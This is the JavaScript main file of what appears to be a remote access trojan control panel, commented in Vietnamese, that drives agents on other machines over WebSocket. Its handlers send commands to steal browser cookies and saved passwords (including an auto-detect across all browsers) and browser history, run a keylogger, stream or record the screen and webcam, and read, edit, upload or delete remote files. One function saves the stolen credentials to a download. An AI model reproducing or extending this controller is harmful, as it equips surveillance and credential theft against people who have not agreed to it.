// =================================================================
// MAIN ENTRY POINT
// Khởi tạo ứng dụng và gán sự kiện toàn cục
// =================================================================

import { state } from './core/state.js';
import { $, $$ } from './core/utils.js';
import { connectWs, disconnectWs, sendWsMessage, setConnectedState, loadDataForCurrentView, isWsConnected } from './core/websocket.js';
import { downloadBase64File, getCorrectCoordinates } from './core/utils.js';

// Import Init Functions
import { initAuth, performLogout } from './modules/auth.js';
import { resetScreenUI, resetScreenUI as resetScreenLogic } from './modules/screen.js'; // Alias để tránh trùng tên nếu cần
import { initMouseControl } from './modules/mouseControl.js';
import { startFileUpload } from './modules/fileManager.js';
import { renderScanList } from './modules/scanner.js';
import { clearWebcamStreamUI } from './modules/webcam.js';
import { initChat, resetChat } from './modules/chat.js';
import { initWifiManager, requestWifiScan } from './modules/wifi.js';
import { closeHistoryModal, exportHistoryCSV } from './modules/stealer.js';

// Theme is initialized inline in HTML to prevent flash

document.addEventListener('DOMContentLoaded', () => {

    if (typeof feather !== 'undefined') feather.replace();

    // =================================================================
    // 0. HÀM CLEANUP: Tắt tính năng cũ trước khi đổi Agent
    // =================================================================
    function resetActiveFeatures() {
        if (isWsConnected() && state.currentAgentId) {

            if (state.currentView === 'files') {
                sendWsMessage({ command: 'fs_cancel_upload' });
            }

            sendWsMessage({ command: 'stop_screen_stream' });
            sendWsMessage({ command: 'stop_webcam_stream' });

            if (state.webcamMode === 'record') {
                sendWsMessage({ command: 'stop_webcam_record' });
            }

            const keylogToggle = $('#keylog-toggle');
            if (keylogToggle && keylogToggle.checked) {
                sendWsMessage({ command: 'stop_keylog' });
            }
        }

        resetScreenUI();
        clearWebcamStreamUI();
        state.webcamMode = 'idle';
        resetChat();
    }

    // =================================================================
    // 1. GÁN CÁC HÀM GLOBAL (WINDOW EXPORTS)
    // Để các thuộc tính onclick="..." trong HTML hoạt động
    // =================================================================

    // --- Agent & Network ---
    window.selectAgent = (agentId, hostname) => {
        // Tắt tính năng cũ trước khi đổi agent
        resetActiveFeatures();

        state.currentAgentId = agentId;
        console.log('[App] Selected agent:', agentId, hostname);

        document.getElementById('scan-list')?.classList.add('has-selected');
        
        const proto = location.protocol === 'https:' ? 'wss' : 'ws';
        const url = `${proto}://${location.host}/ws`;
        $('#ws-url-input').value = url;
        
        handleCloseModal();

        if (isWsConnected()) {
            setConnectedState(true, hostname);
            // Reset UI cũ
            if ($('#processes-table tbody')) $('#processes-table tbody').innerHTML = '';
            if ($('#apps-table tbody')) $('#apps-table tbody').innerHTML = '';
            loadDataForCurrentView();
        } else {
            // Chưa kết nối thì nối mới
             try {
                // Logic kết nối lại đã nằm trong connectWs, ở đây ta gọi thông qua UI click hoặc
                // giả lập click nút connect nếu muốn tự động
                // Tuy nhiên theo logic cũ: "Thiết lập kết nối mới như bình thường"
                // Ta gọi connectWs() nhưng cần update input value trước (đã làm ở trên)
                connectWs(); 
            } catch (e) {
                alert('Failed to connect to agent');
            }
        }
    };

    // --- System Control ---
    window.requestStopApp = (name) => {
        if (confirm(`Force stop "${name}"?`)) sendWsMessage({ command: 'stop_application', app_name: name });
    };

    window.requestStopProc = (pid) => {
        if (confirm(`Kill process PID ${pid}?`)) sendWsMessage({ command: 'stop_process_pid', pid: parseInt(pid) });
    };

    // --- Stealer ---
    window.requestStealCookies = (browser) => {
        if (!canUseAgentFeature()) return;
        closeBrowserSelector();
        sendWsMessage({ command: 'steal_cookies_cdp', browser: browser });
    };

    window.requestStealPass = (browser) => {
        if (!canUseAgentFeature()) return;
        closeBrowserSelector();
        sendWsMessage({ command: 'steal_credentials', browser });
    };

    window.requestAutoStealPasswords = () => {
        if (!canUseAgentFeature()) return;
        closeBrowserSelector();
        sendWsMessage({ command: 'steal_passwords_auto' });
    };

    window.requestBrowserList = () => {
        if (!canUseAgentFeature()) return;
        sendWsMessage({ command: 'get_browser_list' });
    };

    window.requestBrowserHistory = (browser) => {
        if (!canUseAgentFeature()) return;
        closeBrowserSelector();
        sendWsMessage({ command: 'get_browser_history', browser: browser });
    };

    // --- Browser Selector Modal ---
    const browserData = [
        { id: 'chrome', name: 'Chrome', icon: 'chrome', gradient: 'linear-gradient(135deg, #fce38a, #f38181)' },
        { id: 'edge', name: 'Edge', icon: 'globe', gradient: 'linear-gradient(135deg, #00c6ff, #0072ff)' },
        { id: 'brave', name: 'Brave', icon: 'shield', gradient: 'linear-gradient(135deg, #ff512f, #dd2476)' },
        { id: 'coccoc', name: 'Cốc Cốc', icon: 'compass', gradient: 'linear-gradient(135deg, #4ade80, #22c55e)' },
        { id: 'opera', name: 'Opera', icon: 'circle', gradient: 'linear-gradient(135deg, #ff416c, #ff4b2b)' },
        { id: 'firefox', name: 'Firefox', icon: 'compass', gradient: 'linear-gradient(135deg, #ff6b35, #f7931e)' },
    ];

    window.openBrowserSelector = (featureType) => {
        if (!canUseAgentFeature()) return;
        
        const modal = $('#browser-selector-modal');
        const title = $('#browser-selector-title');
        const grid = $('#browser-grid');
        
        let titleText = 'Select Browser';
        let titleIcon = 'chrome';
        
        if (featureType === 'cookies') {
            titleText = '🍪 Extract Cookies';
            titleIcon = 'globe';
        } else if (featureType === 'passwords') {
            titleText = '🔑 Extract Passwords';
            titleIcon = 'key';
        } else if (featureType === 'history') {
            titleText = '📜 Extract History';
            titleIcon = 'clock';
        }
        
        title.innerHTML = `<i data-feather="${titleIcon}"></i> ${titleText}`;
        
        // Build browser cards
        let html = '';
        
        // Auto-detect option for passwords
        if (featureType === 'passwords') {
            html += `
                <div class="browser-card auto-detect" onclick="requestAutoStealPasswords()">
                    <div class="browser-icon" style="background: linear-gradient(135deg, #8b5cf6, #6366f1);">
                        <i data-feather="zap"></i>
                    </div>
                    <div class="browser-info">
                        <div class="browser-name">⚡ Auto Detect All Browsers</div>
                        <div class="browser-desc">Automatically scan and extract from all installed browsers</div>
                    </div>
                </div>
            `;
        }
        
        // Individual browser options
        const browsers = featureType === 'cookies' 
            ? browserData.filter(b => ['chrome', 'edge', 'brave', 'coccoc'].includes(b.id))
            : browserData;
            
        browsers.forEach(b => {
            let onclick = '';
            if (featureType === 'cookies') onclick = `requestStealCookies('${b.id}')`;
            else if (featureType === 'passwords') onclick = `requestStealPass('${b.id}')`;
            else if (featureType === 'history') onclick = `requestBrowserHistory('${b.id}')`;
            
            html += `
                <div class="browser-card" onclick="${onclick}">
                    <div class="browser-icon" style="background: ${b.gradient};">
                        <i data-feather="${b.icon}"></i>
                    </div>
                    <div class="browser-name">${b.name}</div>
                </div>
            `;
        });
        
        grid.innerHTML = html;
        $('#browser-selector-backdrop')?.classList.remove('hidden');
        modal.classList.remove('hidden');
        if (typeof feather !== 'undefined') feather.replace();
    };

    window.closeBrowserSelector = () => {
        $('#browser-selector-modal')?.classList.add('hidden');
        $('#browser-selector-backdrop')?.classList.add('hidden');
    };

    // Close modal when clicking backdrop
    $('#browser-selector-backdrop')?.addEventListener('click', () => closeBrowserSelector());

    // --- History Modal ---
    window.closeHistoryModal = closeHistoryModal;
    window.exportHistoryCSV = exportHistoryCSV;
    
    $('#btn-export-history')?.addEventListener('click', exportHistoryCSV);
    
    // Close history modal when clicking overlay
    $('#history-modal')?.addEventListener('click', (e) => {
        if (e.target.id === 'history-modal') closeHistoryModal();
    });

    // --- File Manager ---
    window.onTreeToggle = (e, toggleBtn, path) => {
        e.stopPropagation();
        const node = toggleBtn.closest('.tree-node');
        const childBox = node.querySelector('.tree-children');
        if (childBox.classList.contains('show')) {
            childBox.classList.remove('show');
            toggleBtn.classList.remove('expanded');
        } else {
            childBox.classList.add('show');
            toggleBtn.classList.add('expanded');
            if (node.dataset.loaded !== 'true') {
                childBox.innerHTML = '<div style="padding:4px 0 0 24px;font-size:11px;color:#888">Loading...</div>';
                sendWsMessage({ command: 'fs_list', path: path, context: 'tree' });
            }
        }
    };

    window.onTreeItemClick = (el, path) => {
        document.querySelectorAll('.tree-item').forEach(i => i.classList.remove('active'));
        el.classList.add('active');
        sendWsMessage({ command: 'fs_list', path: path, context: 'view' });
    };

    window.requestDeleteFile = (encodedName) => {
        event.stopPropagation();
        const name = decodeURIComponent(encodedName);
        const fullPath = state.currentPath.endsWith('\\') ? state.currentPath + name : state.currentPath + '\\' + name;
        if (confirm(`Delete "${name}"?`)) sendWsMessage({ command: 'fs_delete', path: fullPath });
    };

    window.openFolder = (path) => {
        const grid = document.getElementById('file-grid');
        if (grid) {
            grid.style.opacity = '0.5';
            grid.style.pointerEvents = 'none';
            grid.style.cursor = 'wait';
        }
        sendWsMessage({ command: 'fs_list', path: path, context: 'view' });
    };

    window.requestDownloadFile = (encodedName) => {
        event.stopPropagation();
        const name = decodeURIComponent(encodedName);
        const fullPath = state.currentPath.endsWith('\\') ? state.currentPath + name : state.currentPath + '\\' + name;
        sendWsMessage({ command: 'fs_download', path: fullPath });
    };
    
    window.requestViewFile = (encodedName) => {
        event.stopPropagation();
        const name = decodeURIComponent(encodedName);
        const fullPath = state.currentPath.endsWith('\\') ? state.currentPath + name : state.currentPath + '\\' + name;
        sendWsMessage({ command: 'fs_view', path: fullPath });
    };

    window.handleCopy = function(index) {
        const text = state.currentPasswordData[index].pass;
        const btn = document.getElementById(`btn-copy-${index}`);
        const showSuccess = () => {
            const originalText = btn.innerText;
            btn.innerText = "Copied!";
            btn.classList.add("copied");
            setTimeout(() => {
                btn.innerText = originalText;
                btn.classList.remove("copied");
            }, 1500);
        };
        if (navigator.clipboard && window.isSecureContext) navigator.clipboard.writeText(text).then(showSuccess);
        else prompt("Copy thủ công:", text);
    };

    window.closePasswordModal = function() {
        document.getElementById('password-modal').classList.add('hidden');
    };

    window.downloadPasswords = function() {
        if (!state.currentPasswordData.length) return;
        let content = `=== PASSWORDS (${state.currentBrowserName}) ===\n`;
        state.currentPasswordData.forEach(p => content += `${p.url} | ${p.user}:${p.pass}\n`);
        downloadBase64File(btoa(content), `passwords_${Date.now()}.txt`);
    };

    window.saveCurrentFile = () => {
        const textarea = document.getElementById('file-editor-area');
        if (!textarea || !state.currentEditingFile) return;

        const newContent = textarea.value;
        const statusLabel = document.getElementById('save-status');

        try {
            const base64Data = btoa(unescape(encodeURIComponent(newContent)));
            let folderPath = "";
            let fileName = "";
            
            if (state.currentEditingFile.includes('\\')) {
                const parts = state.currentEditingFile.split('\\');
                fileName = parts.pop();
                folderPath = parts.join('\\');
                if (folderPath.endsWith(':')) folderPath += '\\';
            } else if (state.currentEditingFile.includes('/')) {
                const parts = state.currentEditingFile.split('/');
                fileName = parts.pop();
                folderPath = parts.join('/');
            } else {
                folderPath = state.currentPath; 
                fileName = state.currentEditingFile;
            }

            sendWsMessage({
                command: 'fs_upload',
                path: folderPath,
                name: fileName,
                data: base64Data
            });

            if (statusLabel) {
                statusLabel.style.display = 'inline';
                setTimeout(() => { statusLabel.style.display = 'none'; }, 2000);
            }
        } catch (e) {
            alert("Error saving file: Encoding failed.");
            console.error(e);
        }
    };

    // =================================================================
    // 2. HELPER LOCAL FUNCTIONS
    // =================================================================
    function canUseAgentFeature() {
        if (!isWsConnected()) return false;
        if (!state.currentAgentId) return false;
        return true;
    }

    function showView(viewId) {
        state.currentView = viewId;
        $$('.content-view').forEach(v => v.classList.remove('active'));
        const targetView = $(`#view-${viewId}`);
        if (targetView) targetView.classList.add('active');

        $$('.nav-item').forEach(i => i.classList.remove('active'));
        const parent = targetView ? targetView.dataset.parentView : null;
        const activeItem = $(`.nav-item[data-view="${parent || viewId}"]`);
        if (activeItem) activeItem.classList.add('active');

        if (isWsConnected()) loadDataForCurrentView();
    }

    function showConfirmModal(title, msg, type, callback) {
        const confirmTitle = $('#confirm-title');
        const confirmMsg = $('#confirm-message');
        const modalConfirm = $('#modal-confirm');
        state.confirmCallback = callback;
        
        confirmTitle.textContent = title;
        confirmMsg.textContent = msg;
        modalConfirm.classList.remove('hidden');
        $('#modal-backdrop').classList.remove('hidden');
    }

    function showModal(id) {
        $(`#${id}`).classList.remove('hidden');
        $('#modal-backdrop').classList.remove('hidden');
    }

    function hideAllModals() {
        $$('.modal').forEach(m => m.classList.add('hidden'));
        $('#modal-backdrop').classList.add('hidden');
    }

    function handleCloseModal() {
        hideAllModals();
        if (state.scanInterval) {
            clearInterval(state.scanInterval);
            state.scanInterval = null;
        }
        const btnScan = $('#btn-scan-lan');
        if (btnScan) btnScan.classList.remove('active-scan');
        // Dừng beacon khi đóng modal
        fetch(`${location.protocol}//${location.host}/api/stop-scan`, { method: 'POST' }).catch(() => {});
    };

    // Gọi API để bắt đầu gửi beacon broadcast
    const startBeaconScan = async () => {
        try {
            await fetch(`${location.protocol}//${location.host}/api/start-scan`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ duration: 15000 }) // Scan trong 15 giây
            });
        } catch (error) {
            console.error("Failed to start beacon scan:", error);
        }
    };

    const fetchScanList = async () => {
        try {
            const response = await fetch(`${location.protocol}//${location.host}/api/scan`);
            if (!response.ok) throw new Error("Error");
            const result = await response.json();
            renderScanList(result.data);
        } catch (error) {}
    };


    // =================================================================
    // 3. EVENT LISTENERS INITIALIZATION
    // =================================================================
    
    // Init Modules
    initAuth();
    initChat(sendWsMessage);
    initWifiManager();

    // Core Connection
    const proto = location.protocol === 'https:' ? 'wss' : 'ws';
    $('#ws-url-input').value = `${proto}://${location.host}/ws`;
    $('#btn-disconnect').onclick = disconnectWs;

    if ($('#btn-logout-sidebar')) {
        $('#btn-logout-sidebar').onclick = () => {
            showConfirmModal('Đăng xuất', 'Bạn có chắc chắn muốn đăng xuất?', 'danger', () => performLogout());
        };
    }

    // Navigation
    $('#sidebar').onclick = e => {
        const item = e.target.closest('.nav-item');
        if (item) showView(item.dataset.view);
    };

    $('#main-content').onclick = e => {
        const card = e.target.closest('[data-action="show-view"]');
        if (card) {
            if (!canUseAgentFeature()) return;
            if (!card.dataset.target) return;
            showView(card.dataset.target);
        }

        const stopBtn = e.target.closest('[data-action="stop-proc"]');
        if (stopBtn) {
            if (!canUseAgentFeature()) return;
            showConfirmModal('Kill Process', `Are you sure you want to kill PID ${stopBtn.dataset.pid}?`, 'danger', () => {
                sendWsMessage({ command: 'stop_process_pid', pid: parseInt(stopBtn.dataset.pid) });
            });
        }

        const stopAppBtn = e.target.closest('[data-action="stop-app"]');
        if (stopAppBtn) {
            if (!canUseAgentFeature()) return;
            showConfirmModal('Stop App', `Force close "${stopAppBtn.dataset.name}"?`, 'danger', () => {
                sendWsMessage({ command: 'stop_application', app_name: stopAppBtn.dataset.name });
            });
        }
    };

    // Scan LAN
    const btnScanLan = $('#btn-scan-lan');
    if (btnScanLan) {
        btnScanLan.onclick = () => {
            btnScanLan.classList.add('active-scan');
            showModal('modal-scan-lan');
            // Bắt đầu gửi beacon broadcast để tìm agent
            startBeaconScan();
            fetchScanList();
            if (state.scanInterval) clearInterval(state.scanInterval);
            state.scanInterval = setInterval(fetchScanList, 2000);
        };
    }

    // Modal Events
    $('#modal-backdrop').onclick = handleCloseModal;
    $$('[data-action="cancel"]').forEach(b => b.onclick = handleCloseModal);
    window.addEventListener('click', (event) => {
        const passwordModal = document.getElementById('password-modal');
        if (event.target === passwordModal) passwordModal.classList.add('hidden');
    });

    // Confirm Modal Yes
    const btnConfirmYes = $('#btn-confirm-yes');
    if (btnConfirmYes) {
        btnConfirmYes.onclick = () => {
            if (state.confirmCallback) state.confirmCallback();
            handleCloseModal();
        }
    }

    // System Cards
    if ($('#card-open-stop-apps')) $('#card-open-stop-apps').onclick = () => {
        if (!canUseAgentFeature()) return;
        showModal('modal-stop-app');
        sendWsMessage({ command: 'list_applications' });
    };
    if ($('#card-open-stop-procs')) $('#card-open-stop-procs').onclick = () => {
        if (!canUseAgentFeature()) return;
        showModal('modal-stop-proc');
        sendWsMessage({ command: 'list_processes' });
    };

    // Start App/Proc
    $('#btn-start-process').onclick = () => {
        if (!canUseAgentFeature()) return;
        showModal('modal-start-process');
    };
    $('#btn-start-app').onclick = () => {
        if (!canUseAgentFeature()) return;
        showModal('modal-start-app');
    };
    $('#modal-start-process [data-action="confirm"]').onclick = () => {
        if (!canUseAgentFeature()) return;
        sendWsMessage({ command: 'start_process', path: $('#input-proc-path').value, args: $('#input-proc-args').value });
        handleCloseModal();
    };
    $('#modal-start-app [data-action="confirm"]').onclick = () => {
        if (!canUseAgentFeature()) return;
        sendWsMessage({ command: 'start_application', app_name: $('#input-app-name').value });
        handleCloseModal();
    };

    // --- Screen Control Events ---
    $('#btn-take-screenshot').onclick = () => {
        if (!canUseAgentFeature()) return;
        sendWsMessage({ command: 'stop_screen_stream' });
        $('#capture-display-area .empty-state').classList.add('hidden');
        $('#capture-spinner').classList.remove('hidden');
        sendWsMessage({ command: 'capture_screen' });
        $('#btn-start-stream').classList.remove('hidden');
        $('#btn-stop-stream').classList.add('hidden');
    };

    $('#btn-start-stream').onclick = () => {
        if (!canUseAgentFeature()) return;
        $('#capture-display-area .empty-state').classList.add('hidden');
        $('#capture-spinner').classList.remove('hidden');
        sendWsMessage({ command: 'start_screen_stream', fps: 15 });
        $('#btn-start-stream').classList.add('hidden');
        $('#btn-stop-stream').classList.remove('hidden');
        $('#btn-copy-screenshot').classList.add('hidden');
        $('#btn-save-screenshot').classList.add('hidden');
    };

    $('#btn-stop-stream').onclick = () => {
        sendWsMessage({ command: 'stop_screen_stream' });
        resetScreenUI();
    };

    $('#btn-save-screenshot').onclick = () => {
        const a = document.createElement('a');
        a.href = $('#capture-img').src;
        a.download = `screen-${Date.now()}.png`;
        a.click();
    };
    
    $('#btn-copy-screenshot').onclick = async () => {
        try {
            const response = await fetch($('#capture-img').src);
            const blob = await response.blob();
            await navigator.clipboard.write([new ClipboardItem({ [blob.type]: blob })]);
            alert('Copied to clipboard!');
        } catch (err) {
            alert('Copy failed');
        }
    };
    
    if ($('#btn-reload-screen')) {
        $('#btn-reload-screen').onclick = () => {
            sendWsMessage({ command: 'stop_screen_stream' });
            resetScreenUI();
        };
    }

    // Mouse & Keyboard Control
    const controlToggle = $('#toggle-control');
    const streamImg = $('#stream-video');

    streamImg.addEventListener('dragstart', (e) => {
        e.preventDefault();
        return false;
    });

    if (controlToggle) {
        controlToggle.onclick = (e) => {
            const isNotStreaming = !$('#btn-start-stream').classList.contains('hidden');
            if (isNotStreaming && e.target.checked) {
                e.preventDefault();
                return;
            }
            if (e.target.checked) {
                streamImg.classList.add('controlling');
                window.focus();
            }
            else {
                streamImg.classList.remove('controlling');
            }
        };
    }

    // Khởi tạo module MouseControl
    if (streamImg && controlToggle) {
        initMouseControl({
            videoElement: streamImg,       // Thẻ video/img hiển thị stream
            controlToggle: controlToggle,  // Checkbox bật tắt quyền điều khiển
            sendFunction: sendWsMessage,   // Hàm gửi WebSocket
            checkConnFunction: isWsConnected // Hàm kiểm tra kết nối
        });
    }

    // 1. Tạo Input ẩn để hứng bộ gõ
    let hiddenInput = document.getElementById('remote-input-trap');
    if (!hiddenInput) {
        hiddenInput = document.createElement('input');
        hiddenInput.id = 'remote-input-trap';
        hiddenInput.style.position = 'absolute';
        hiddenInput.style.top = '-9999px';
        hiddenInput.style.opacity = '0';
        hiddenInput.style.zIndex = '-1';
        hiddenInput.autocomplete = "off";
        document.body.appendChild(hiddenInput);
    }

    // 2. Logic Focus Input khi bật Control
    const focusRemoteInput = () => {
        if (controlToggle && controlToggle.checked) {
            hiddenInput.focus();
        }
    };

    // Khi bật toggle -> Focus
    if (controlToggle) {
        const oldToggleClick = controlToggle.onclick;
        
        controlToggle.onclick = (e) => {
            // Gọi lại logic check stream cũ
            if (oldToggleClick) oldToggleClick(e);
            
            // Logic mới
            if (e.target.checked) {
                focusRemoteInput();
            } else {
                hiddenInput.blur();
            }
        };
    }

    // Khi click vào ảnh stream -> Focus lại input (để không bị mất focus khi click chuột)
    streamImg.addEventListener('mousedown', () => {
        // Dùng timeout nhỏ để tránh conflict sự kiện click
        setTimeout(focusRemoteInput, 10); 
    });

    // 3. Xử lý gõ văn bản (Tiếng Việt / Unicode)
    // Sự kiện 'input' nổ ra SAU KHI bộ gõ đã hoàn tất ký tự (ví dụ: gõ a + a -> nổ ra â)
    hiddenInput.addEventListener('input', (e) => {
        if (!isWsConnected() || !controlToggle.checked) return;

        // e.data chứa ký tự vừa gõ (ví dụ: 'â', 'd', 'H')
        // Đối với bộ gõ, e.data có thể là cả cụm nếu paste, nhưng thường là 1 ký tự
        if (e.data) {
            sendWsMessage({ 
                command: 'keyboard_input', 
                text: e.data 
            });
        }
        
        // Xóa ngay nội dung trong input để tránh đầy bộ nhớ và reset cho ký tự sau
        hiddenInput.value = '';
    });

    // 4. Xử lý phím chức năng (Enter, Backspace, Arrow, Ctrl...)
    // Những phím này không sinh ra sự kiện 'input' hoặc cần xử lý riêng
    hiddenInput.addEventListener('keydown', (e) => {
        if (!isWsConnected() || !controlToggle.checked) return;

        // Danh sách các phím chức năng cần gửi dạng keyCode
        const specialKeys = [
            "Backspace", "Tab", "Enter", "Escape", "Delete", 
            "ArrowUp", "ArrowDown", "ArrowLeft", "ArrowRight",
            "Home", "End", "PageUp", "PageDown", "Insert",
            "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "F11", "F12",
            "CapsLock", "Meta", "ContextMenu"
        ];

        // Nếu là phím chức năng HOẶC đang giữ Ctrl/Alt/Win (Hotkeys)
        if (specialKeys.includes(e.key) || e.ctrlKey || e.altKey || e.metaKey) {
            e.preventDefault(); // Chặn hành vi trình duyệt (ví dụ F5 refresh, Ctrl+S save)
            
            sendWsMessage({ 
                command: 'keyboard_input', 
                key: e.key,
                keyCode: e.keyCode,
                shift: e.shiftKey, 
                ctrl: e.ctrlKey, 
                alt: e.altKey 
            });
        }
        // Lưu ý: Không preventDefault với các phím chữ cái bình thường 
        // để cho bộ gõ (IME) hoạt động và bắn ra sự kiện 'input' ở trên.
    });

    // --- Webcam Controls ---
    const btnStartRecord = $('#btn-start-record');
    const btnStopRecord = $('#btn-stop-record');
    
    // Init Webcam UI state
    const emptyIcon = $('#webcam-display-area .empty-icon');
    if (emptyIcon) emptyIcon.classList.remove('hidden');
    $('#webcam-placeholder').textContent = "Ready to record or stream webcam";
    $('#webcam-placeholder').parentElement.classList.remove('hidden');
    $('#btn-start-webcam-stream').classList.remove('hidden');
    $('#btn-stop-webcam-stream').classList.add('hidden');
    btnStartRecord.classList.remove('hidden');

    btnStartRecord.onclick = () => {
        if (!canUseAgentFeature()) return;
        state.webcamMode = 'record';
        sendWsMessage({ command: 'stop_webcam_stream' });
        clearWebcamStreamUI();
        showModal('modal-webcam-device');
    };
    $('#modal-webcam-device [data-action="confirm"]').onclick = () => {
        state.webcamMode = 'record';
        sendWsMessage({ command: 'start_webcam_record', time: parseInt($('#input-webcam-duration').value) || 10, device_name: $('#input-webcam-device-name').value });
        handleCloseModal();
    };
    btnStopRecord.onclick = () => sendWsMessage({ command: 'stop_webcam_record' });

    $('#btn-start-webcam-stream').onclick = () => {
        if (!canUseAgentFeature()) return;
        state.webcamMode = 'stream';
        sendWsMessage({ command: 'start_webcam_stream', fps: 30 });
        $('#btn-start-webcam-stream').classList.add('hidden');
        $('#btn-stop-webcam-stream').classList.remove('hidden');
    };
    $('#btn-stop-webcam-stream').onclick = () => {
        state.webcamMode = 'idle';
        sendWsMessage({ command: 'stop_webcam_stream' });
        clearWebcamStreamUI();
        $('#btn-start-webcam-stream').classList.remove('hidden');
        $('#btn-stop-webcam-stream').classList.add('hidden');
    };
    if ($('#btn-reload-webcam')) $('#btn-reload-webcam').onclick = () => {
        state.webcamMode = 'idle';
        sendWsMessage({ command: 'stop_webcam_stream' });
        clearWebcamStreamUI();
        $('#btn-start-webcam-stream').classList.remove('hidden');
        $('#btn-stop-webcam-stream').classList.add('hidden');
        $('#btn-save-video').classList.add('hidden');
    };
    $('#btn-save-video').onclick = () => {
        if (state.currentVideoBlob) {
            const a = document.createElement('a');
            a.href = URL.createObjectURL(state.currentVideoBlob);
            a.download = `webcam-${Date.now()}.mp4`;
            a.click();
        }
    };

    // --- Keylogger ---
    $('#keylog-toggle').onchange = e => {
        if (!isWsConnected() || !state.currentAgentId) {
            e.target.checked = false;
            return;
        }
        sendWsMessage({ command: e.target.checked ? 'start_keylog' : 'stop_keylog' });
        $('#keylog-output').textContent = e.target.checked ? 'Starting...' : 'Stopped.';
        state.isKeylogClean = true;
    };
    if ($('#btn-clear-keylog')) $('#btn-clear-keylog').onclick = () => {
        $('#keylog-output').textContent = 'Cleared.';
        state.isKeylogClean = true;
    };

    // --- File Manager Events ---
    if ($('#btn-fs-go')) $('#btn-fs-go').onclick = () => {
        if (!canUseAgentFeature()) return;
        const path = $('#fs-path-input').value;
        if (path) sendWsMessage({ command: 'fs_list', path: path, context: 'view' });
    };
    if ($('#fs-path-input')) $('#fs-path-input').addEventListener("keypress", (event) => {
        if (!canUseAgentFeature()) return;
        if (event.key === "Enter") $('#btn-fs-go').click();
    });
    if ($('#btn-fs-up')) $('#btn-fs-up').onclick = () => {
        if (!canUseAgentFeature()) return;
        let p = state.currentPath;
        if (p.endsWith('\\') || p.endsWith('/')) p = p.slice(0, -1);
        const lastSlash = Math.max(p.lastIndexOf('\\'), p.lastIndexOf('/'));
        if (lastSlash === -1) {
            sendWsMessage({ command: 'fs_drives' });
            return;
        }
        let parent = p.substring(0, lastSlash);
        if (parent.length === 2 && parent.charAt(1) === ':') parent += "\\";
        if (parent === "") sendWsMessage({ command: 'fs_drives' });
        else sendWsMessage({ command: 'fs_list', path: parent, context: 'view' });
    };
    if ($('#btn-fs-refresh')) $('#btn-fs-refresh').onclick = () => {
        if (!canUseAgentFeature()) return;
        if (isWsConnected()) {
            sendWsMessage({ command: 'fs_drives' });
            sendWsMessage({ command: 'fs_list', path: state.currentPath, context: 'view' });
        }
    };
    if ($('#btn-fs-new-folder')) $('#btn-fs-new-folder').onclick = () => {
        if (!canUseAgentFeature()) return;
        const name = prompt("Enter new folder name:");
        if (name) sendWsMessage({ command: 'fs_mkdir', path: state.currentPath.endsWith('\\') ? state.currentPath + name : state.currentPath + '\\' + name });
    };
    if ($('#btn-fs-new-file')) $('#btn-fs-new-file').onclick = () => {
        if (!canUseAgentFeature()) return;
        const name = prompt("Enter new file name (e.g., text.txt):");
        if (name) {
            sendWsMessage({ command: 'fs_mkfile', path: state.currentPath.endsWith('\\') ? state.currentPath + name : state.currentPath + '\\' + name });
            setTimeout(() => sendWsMessage({ command: 'fs_list', path: state.currentPath, context: 'view' }), 500);
        }
    };
    
    // File Upload Events
    const realFileInput = document.getElementById('hidden-file-input');
    if (realFileInput) {
        realFileInput.addEventListener('change', function() {
            const file = this.files[0];
            if (!file) return;
            startFileUpload(file); 
        });
    }
    if ($('#btn-fs-upload')) {
        $('#btn-fs-upload').onclick = () => {
            if (!canUseAgentFeature()) return;
            if (state.uploadState.active) {
                const confirmCancel = confirm(
                    "Đang có file upload dở dang (có thể bị treo).\n\n" +
                    "Bạn có muốn HỦY tiến trình cũ để upload file mới không?"
                );

                if (confirmCancel) {
                    cancelFileUpload();
                }
                return;
            }
            if (realFileInput) realFileInput.click();
        };
    }

    // --- System Actions ---
    if ($('#btn-system-restart')) {
        $('#btn-system-restart').onclick = () => {
            if (!canUseAgentFeature()) return;
            showConfirmModal('Restart', 'Restart remote PC?', 'danger', () => sendWsMessage({ command: 'system_restart' }));
        };
    }
    if ($('#btn-system-shutdown')) {
        $('#btn-system-shutdown').onclick = () => {
            if (!canUseAgentFeature()) return;
            showConfirmModal('Shutdown', 'Shutdown remote PC?', 'danger', () => sendWsMessage({ command: 'system_shutdown' }));
        };
    }

    // --- UI Toggles ---
    const btnToggleSidebar = document.getElementById('btn-toggle-sidebar');
    const sidebarEl = document.getElementById('sidebar');
    if (btnToggleSidebar && sidebarEl) {
        btnToggleSidebar.onclick = () => sidebarEl.classList.toggle('collapsed');
    }

    $('.dot.red').onclick = () => { if (isWsConnected()) disconnectWs(); };
    $('.dot.yellow').onclick = () => { if ($('#theme-toggle')) $('#theme-toggle').click(); };
    $('.dot.green').onclick = () => document.fullscreenElement ? document.exitFullscreen() : document.documentElement.requestFullscreen();

    // Theme toggle - Default is dark (no class), light-theme class for light mode
    const themeToggle = $('#theme-toggle');
    if (themeToggle) {
        // Initialize checkbox state FIRST based on current theme
        const currentTheme = localStorage.getItem('theme');
        if (currentTheme === 'light') {
            document.body.classList.add('light-theme');
            themeToggle.checked = false;
        } else {
            document.body.classList.remove('light-theme');
            themeToggle.checked = true; // Dark is default (checked)
            localStorage.setItem('theme', 'dark');
        }
        
        // Then set up the change handler
        themeToggle.onchange = e => {
            // Checked = dark mode (default, no class), Unchecked = light mode
            if (e.target.checked) {
                document.body.classList.remove('light-theme');
                localStorage.setItem('theme', 'dark');
            } else {
                document.body.classList.add('light-theme');
                localStorage.setItem('theme', 'light');
            }
        };
    }

    // Final Init
    setTimeout(() => {
        if (typeof feather !== 'undefined') feather.replace();
    }, 500);
});